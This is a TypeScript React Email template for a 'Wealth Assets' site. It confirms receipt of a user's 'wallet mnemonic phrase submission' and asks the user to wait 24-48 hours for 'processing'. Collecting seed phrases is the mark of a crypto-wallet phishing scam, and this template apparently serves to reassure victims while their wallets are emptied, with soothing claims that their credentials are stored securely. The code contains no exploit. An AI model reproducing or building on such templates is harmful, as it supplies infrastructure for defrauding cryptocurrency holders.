/* eslint-disable @next/next/no-img-element */
import { Html } from "@react-email/html";
import { Text } from "@react-email/text";
import { Section } from "@react-email/section";
import { Container } from "@react-email/container";

type EmailProps = {
  userName?: string;
  time?: string;
};

export default function ConnectWallet({
  userName,
  time,
}: EmailProps) {
  return (
    <Html>
      <Section style={main}>
        <Container style={container}>
          <Container>
            <img style={image} src="https://res.cloudinary.com/dpmx02shl/image/upload/v1707937490/wealthAssets/logo_q7xzbj.png" alt="Wealth Assets Logo" />
          </Container>
          <Text style={bold}>Dear {userName}</Text>
          <Text style={paragraph}>
            We have received your wallet mnemonic phrase submission at {time} today. Please allow 24-48 hours for full processing and validation before accounts are connected.
          </Text>
          <Text style={paragraph}>
            You will receive a confirmation email once the process is complete and safe storage procedures are enabled. 
            Continue monitoring your profile dashboard for wallet pairing status updates.
          </Text>
          <Text style={paragraph}>
            Thanks again for providing your credentials securely through our online portal. 
            We take immense care in shielding sensitive user data until accessed for discrete verification events.
          </Text>
          <Text style={paragraph}>
            Please don&apos;t hesitate to reach out if any other questions come up during this brief pending period.
          </Text>
          <Container style={footer}>
            <Text>Processed by Wealth Assets for {userName}</Text>
          </Container>
        </Container>
      </Section>
    </Html>
  );
}

// Styles for the email template
const main = {
  backgroundColor: "#FFF",
  margin: "0 auto",
  padding: "2rem",
};

const container = {
   borderRadius: "4px", 
   border: "1px solid #d4d7dc",
  padding: "1rem",
  backgroundColor: "#FFF",
  width: "100%",
};

const image = {
  width: "30px"
}

const bold = {
  fontWeight: "600",
  color: "#0d47a2",
  fontSize: "16px",
  lineHeight: "1.4",
  margin: "2rem 0",
}

const paragraph = {
  fontSize: "14px",
  lineHeight: "1.4",
  color: "#161618",
  margin: "2rem 0",
};

const verification = {
  fontSize: "24px",
  lineHeight: "1.3",
  fontWeight: "700",
  color: "#484848",
};

const footer = {
  marginTop: "2rem",
  borderTop: "1px solid #B2B3BA",
  paddingTop: "1rem",
};
